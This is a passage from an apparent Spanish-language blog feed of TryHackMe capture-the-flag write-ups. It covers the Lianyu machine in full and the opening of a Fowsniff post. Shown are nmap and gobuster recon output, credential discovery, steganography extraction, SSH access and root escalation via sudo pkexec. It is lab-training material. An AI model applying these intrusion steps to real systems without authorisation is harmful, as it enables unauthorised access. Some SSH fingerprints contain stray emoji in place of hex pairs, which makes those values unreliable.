&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Sat Jun 27 01:14:57 2020 as: nmap -sV -o nmap_scan_mini lianyu.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; lianyu.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.79.149&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.15s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;996&lt;/span&gt; closed ports
PORT    STATE SERVICE VERSION
21/tcp  open  ftp     vsftpd 3.0.2
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp  open  http    Apache httpd
111/tcp open  rpcbind 2-4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RPC &lt;span class=&#34;c1&#34;&gt;#100000)&lt;/span&gt;
Service Info: OSs: Unix, Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Sat Jun 27 01:15:31 2020 -- 1 IP address (1 host up) scanned in 33.78 seconds&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Sat Jun 27 01:15:08 2020 as: nmap -T4 -sV -sC -p- -o nmap_scan lianyu.thm&lt;/span&gt;
Warning: 10.10.79.149 giving up on port because retransmission cap hit &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;6&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; lianyu.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.79.149&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.15s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65517&lt;/span&gt; closed ports
PORT      STATE    SERVICE VERSION
21/tcp    open     ftp     vsftpd 3.0.2
22/tcp    open     ssh     OpenSSH 6.7p1 Debian 5+deb8u8 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;1024&lt;/span&gt; 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e🇩🇪87:f4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;DSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; a6:69:96:d7:6d:61:27:96:7e:bb:9f:83:60:1b:52:12 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 3f:43:76:75:a8:5a:a6💿33:b0:66:42:04:91:fe:a0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp    open     http    Apache httpd
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Purgatory
111/tcp   open     rpcbind 2-4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RPC &lt;span class=&#34;c1&#34;&gt;#100000)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; rpcinfo: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   program version    port/proto  service
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;100000&lt;/span&gt;  2,3,4        111/tcp   rpcbind
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;100000&lt;/span&gt;  2,3,4        111/udp   rpcbind
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;100000&lt;/span&gt;  3,4          111/tcp6  rpcbind
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;100000&lt;/span&gt;  3,4          111/udp6  rpcbind
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;100024&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;          35854/udp6  status
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;100024&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;          39587/tcp6  status
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;100024&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;          40288/udp   status
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;100024&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;          47359/tcp   status
7573/tcp  filtered unknown
8324/tcp  filtered unknown
12786/tcp filtered unknown
14426/tcp filtered unknown
18334/tcp filtered unknown
24024/tcp filtered unknown
27137/tcp filtered unknown
37836/tcp filtered unknown
40619/tcp filtered unknown
47359/tcp open     status  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RPC &lt;span class=&#34;c1&#34;&gt;#100024)&lt;/span&gt;
49276/tcp filtered unknown
54432/tcp filtered unknown
56048/tcp filtered unknown
60898/tcp filtered unknown
Service Info: OSs: Unix, Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Sat Jun 27 01:41:23 2020 -- 1 IP address (1 host up) scanned in 1574.59 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Encontramos una pagina web en el puerto 80.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/lianyu/Screenshot_20200627_001803.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/lianyu# gobuster dir -u http://lianyu.thm/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -q -t &lt;span class=&#34;m&#34;&gt;250&lt;/span&gt; -x php,html,txt
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/island &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Encontramos una pagina donde hay una palabra clave.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/lianyu/Screenshot_20200627_005713.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Nuevamente ejecutamos GOBUSTER en este directorio nuevo.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/lianyu# gobuster dir -u http://lianyu.thm/island/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -q -t &lt;span class=&#34;m&#34;&gt;100&lt;/span&gt; -x php,html,txt
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/2100 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;En el nuevo directorio encontramos un video de YouTube incrustado en la pagina.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/lianyu/Screenshot_20200627_011805.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En el codigo fuente de esta pagina encontramos un comentarios que indica que podemos aprovechar nuestro &lt;code&gt;.ticket&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/lianyu/Screenshot_20200627_012840.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Intentamos ejecutar nuevamente GOBUSTER sobre este directorio para ver si encontramos algun otro directorio o pagina, pero no logramos. Por lo que agregamos &lt;code&gt;ticket&lt;/code&gt; como una extension en gobuster. Al hacer esto encontramos una nueva pagina, en la que muestra un &lt;em&gt;&amp;ldquo;token&amp;rdquo;&lt;/em&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/lianyu# gobuster dir -u http://lianyu.thm/island/2100/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -q -t &lt;span class=&#34;m&#34;&gt;100&lt;/span&gt; -x php,html,txt,ticket
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/green_arrow.ticket &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/lianyu/Screenshot_20200627_013334.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos CyberChef para poder decodificar el token, utilizamos base32.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/lianyu/Screenshot_20200627_013627.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;ftp&#34;&gt;FTP&lt;/h2&gt;
&lt;p&gt;Ahora tenemos una palabra clave y un token, utilizamos ambos como credenciales en el servicio FTP y logramos obtener acceso.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/lianyu/Screenshot_20200627_013800.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Vemos varios archivos los cuales descargamos, la mayoria, imagenes. Al analizar las imagenes nos damos cuenta de que una de ellas aun teniendo la extension PNG sus &lt;code&gt;magic numbers&lt;/code&gt; no son los que deberian.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/lianyu/Screenshot_20200627_014616.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos &lt;code&gt;hexeditor&lt;/code&gt; para editar y agregar los &lt;code&gt;magic numbers&lt;/code&gt; de una imagen PNG.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-hex&#34; data-lang=&#34;hex&#34;&gt;89 50 4E 47 0D 0A 1A 0A
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/lianyu/Screenshot_20200627_014713.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;steganografia&#34;&gt;STEGANOGRAFIA&lt;/h2&gt;
&lt;p&gt;Al realizar los cambios vemos en la imagen una contraseña. Pero ¿para qué?.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/lianyu/Screenshot_20200627_014824.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En las imagenes que descargamos vemos una con extension jpg, inspeccionamos esta imagen para ver si existe un archivo dentro de esta, utilizando &lt;code&gt;steghide&lt;/code&gt; junto a la contraseña. El resultado nos muestra que hay dos archivos.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/lianyu/Screenshot_20200627_015117.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Extraemos los archivos y vemos un mensaje en uno de estos y lo que parece ser una contraseña en el otro.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/lianyu/Screenshot_20200627_015313.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;user---ssh&#34;&gt;USER - SSH&lt;/h2&gt;
&lt;p&gt;Intentamos utilizar la contraseña que encontramos en el servicio SSH con el usuario de FTP, pero no logramos obtener acceso. Regresamos nuevamente a FTP, y revisamos el directorio actual, vemos que es en el &lt;code&gt;home&lt;/code&gt;, intentamos regresar y vemos el nombre de el otro usuario.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/lianyu/Screenshot_20200627_021536.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos la contraseña con este usuario y logramos obtener acceso y nuestra flag &lt;strong&gt;user.txt&lt;/strong&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/lianyu/Screenshot_20200627_021646.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Hacemos una pequeña enumeracion con &lt;code&gt;sudo -l -l&lt;/code&gt; y vemos que tenemos permisos root (sudo) para ejecutar el comando &lt;code&gt;pkexec&lt;/code&gt;. Utilizamos &lt;a href=&#34;https://gtfobins.github.io/gtfobins/pkexec/&#34;&gt;pkexec&lt;/a&gt; para obtener una shell root.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/lianyu/Screenshot_20200627_021830.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Obtenemos una shell con usuario root y nuestra flag &lt;strong&gt;root.txt&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/lianyu/Screenshot_20200627_021905.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/lianyu/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/lianyu/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Fowsniff CTF</title>
        <link>https://sckull.github.io/posts/fowsniff/</link>
        <pubDate>Sun, 21 Jun 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Sun, 21 Jun 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/fowsniff/</guid>
        <description>Fowsniff CTF es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.</description>
        <content:encoded>&lt;p&gt;Fowsniff CTF es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/fowsniff/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Fowsniff CTF&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;Hack this machine and get the flag. There are lots of hints along the way and is perfect for beginners!&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;450&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/ben&#34;&gt;ben&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto 80 (http), imap/pop3 (110,143) y el puerto ssh (22) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Mon Jun 22 18:36:02 2020 as: nmap -sV -o nmap_scan_mini fowsniff.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; fowsniff.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.225.64&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.16s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;996&lt;/span&gt; closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp  open  http    Apache httpd 2.4.18 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
110/tcp open  pop3    Dovecot pop3d
143/tcp open  imap    Dovecot imapd
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Mon Jun 22 18:36:34 2020 -- 1 IP address (1 host up) scanned in 31.57 seconds&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Mon Jun 22 18:35:44 2020 as: nmap -T4 -sV -sC -p- -o nmap_scan fowsniff.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; fowsniff.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.225.64&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.18s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65531&lt;/span&gt; closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; 90:35:66:f4:c6:d2:95:12:1b:e8:cd🇩🇪aa:4e:03:23 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
